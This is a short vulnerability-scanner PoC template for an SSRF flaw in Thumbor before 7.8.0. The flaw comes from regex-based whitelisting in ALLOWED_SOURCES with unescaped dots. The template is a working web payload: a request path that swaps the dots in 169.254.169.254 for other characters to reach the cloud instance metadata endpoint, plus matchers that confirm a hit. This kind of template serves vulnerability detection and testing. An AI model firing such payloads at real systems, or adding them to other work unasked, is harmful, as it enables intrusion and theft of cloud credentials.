[info]
author = "ave"
description = "验证 Thumbor 7.8.0 之前版本中 ALLOWED_SOURCES 配置将纯字符串直接传递给 re.match() 而未转义点号，导致域名白名单可被正则通配符绕过的 SSRF 漏洞。攻击者通过将域名中的点号替换为任意字符（如 sXglbimgYcom 绕过 s.glbimg.com），可获取任意主机资源。"
id = "POC-AVE-2026-0765"
name = "Thumbor ALLOWED_SOURCES Regex Bypass SSRF PoC"
severity = "high"
tags = ["ave-2026-0765"]
vuln_id = [
    "CVE-2026-53500",
    "AVE-2026-0765",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/unsafe/http://169X254Y169Z254/latest/meta-data/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "ami-id",
    "instance-id",
    "meta-data",
]
